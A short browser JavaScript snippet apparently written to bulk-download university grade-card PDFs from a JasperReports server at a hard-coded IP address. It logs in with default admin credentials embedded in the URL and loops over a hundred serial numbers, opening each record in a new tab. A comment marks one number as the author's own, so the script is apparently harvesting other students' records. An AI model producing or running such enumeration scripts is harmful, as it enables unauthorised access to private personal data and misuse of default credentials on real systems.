//62977 is mine && 62699 is the lower limit

let a = document.querySelector('#jmi');
let initial = 63498; 
let batch_counter = 0;
let _url = '';

//stage2 62798 // stage3 62898 //stage4 62998 //stage5 63098 //stage6 63198


    function changer(){
    initial += 1;
    _url=`http://13.250.148.144/jasperserver/flow.html?_flowId=viewReportFlow&standAlone=true&_flowId=viewReportFlow&ParentFolderUri=%2Freports%2Fgradecard_jmi&reportUnit=%2Freports%2Fgradecard_jmi%2Fgradecard12_extra&j_username=jasperadmin&j_password=jasperadmin&output=pdf&trcoursecode=TR00003168&frmslno=${initial}&toslno=${initial}`;
    window.open(_url,'_blank');
    }
while(initial < 63598){
    changer();
}
batch_counter +=1;
console.log(`${batch_counter} executed`);




//Log :
// till 62798